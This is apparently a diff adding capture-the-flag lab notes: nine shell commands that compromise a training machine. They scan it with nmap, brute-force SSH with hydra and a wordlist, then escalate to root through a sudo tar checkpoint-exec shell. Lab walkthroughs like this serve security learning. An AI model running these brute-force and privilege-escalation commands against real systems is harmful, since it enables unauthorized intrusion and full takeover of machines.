@@ -1,0 +1,9 @@
+1 - nmap -A 10.10.252.213
+2 - ftp 10.10.252.213 -> passive
+3 - hydra -l lin -P locks.txt ssh://10.10.252.213
+4 - ssh lin@10.10.252.213
+5 - cat user.txt
+6 - sudo -l (tar)
+7 - sudo tar -cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=/bin/sh
+8 - whoami
+9 - cat /root/root.txt
